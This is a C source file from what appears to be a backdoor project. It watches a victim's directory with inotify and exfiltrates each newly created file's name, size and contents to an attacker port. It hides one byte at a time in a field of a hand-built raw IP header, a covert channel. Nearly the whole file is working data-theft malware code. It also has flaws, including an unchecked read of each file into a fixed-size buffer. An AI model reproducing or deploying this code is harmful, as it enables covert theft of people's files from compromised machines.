#include "filetracker.h"


int track_file(struct options_victim* opts) {
    int length, i = 0;
    int fd, wd;
    char buffer[EVENT_BUF_LEN] = {0};
    char chunk[EVENT_BUF_LEN] = {0};
    struct stat st;
    const char* start = "start[";
    const char* end = "]end";
    const char* size = " size: ";
    int file_name_len;
    long file_size = 0;
    char str_file_size[20] = {0};
    FILE * fp;

    fd = inotify_init();
    if ( fd < 0 ) {
        perror( "inotify_init" );
    }

    /* adding the directory into watch list. */
    wd = inotify_add_watch(fd, opts->target_directory, IN_CREATE);

    /* read to determine the event change happens on  directory.
     * Actually this read blocks until the change event occurs*/
    length = (int) read(fd, buffer, EVENT_BUF_LEN);
    if (length < 0) {
        perror( "read");
    }

    /* read return the list of change events happens.
     * read the change event one by one and process it accordingly.*/
    while (i < length) {
        struct inotify_event *event = (struct inotify_event *) &buffer[ i ];
        if (event->len) {
            if (event->mask & IN_CREATE) {
                if (event->mask & IN_ISDIR) {
                    printf("New directory %s created.\n", event->name);
                }
                else {
                    printf("New file %s created.\n", event->name);
                    fp = fopen(event->name, "rb");
                    if (fp == NULL) {
                        perror("Cannot open file.\n");
                        exit(1);
                    }
                    stat(event->name, &st);
                    file_name_len = (int)strlen(event->name);
                    file_size = st.st_size;

                    fread(chunk, (unsigned long) file_size, 1, fp);
                    fclose(fp);


                    snprintf(str_file_size, 20, "%d", (int)file_size);

                    send_packet(opts, (int)strlen(start), start);   // "start[
                    send_packet(opts, file_name_len, event->name);
                    send_packet(opts, (int)strlen(size), size);     // " size: "
                    send_packet(opts, (int)strlen(str_file_size), str_file_size);
                    send_packet(opts, (int)strlen(end), end);
                    send_packet(opts, (int)file_size, (const char*) chunk);
                    memset(str_file_size, 0, 20);
                }
            }
        }
        i += EVENT_SIZE + event->len;
    }
    /* removing the directory from the watch list.*/
    inotify_rm_watch(fd, wd);

    /*closing the INOTIFY instance*/
    close(fd);
}


void send_packet(struct options_victim* opts, int size, char *str) {
    struct iphdr ih;
    struct tcphdr th;
    char s_buffer[TCP_SEND_SIZE] = {0};
    int bytes;

    for (int i = 0; i < size; i++) {
        create_tcp_header(&th, VIC_FILE_PORT, ATC_FILE_PORT);
        create_ip_header(&ih, opts, 'V', (uint16_t) str[i], 'T');
        memcpy(s_buffer, &ih, sizeof(struct iphdr));
        memcpy(s_buffer + sizeof(struct iphdr), &th, sizeof(struct tcphdr));
        bytes = (int)sendto(opts->tcp_socket, (const char *) s_buffer, TCP_SEND_SIZE, 0,
                            (const struct sockaddr *) &opts->tcpsa, sizeof(opts->tcpsa));
        if(bytes == -1) {
            perror("send_file() error\n");
        }
        memset(s_buffer, 0, TCP_SEND_SIZE);
    }
}



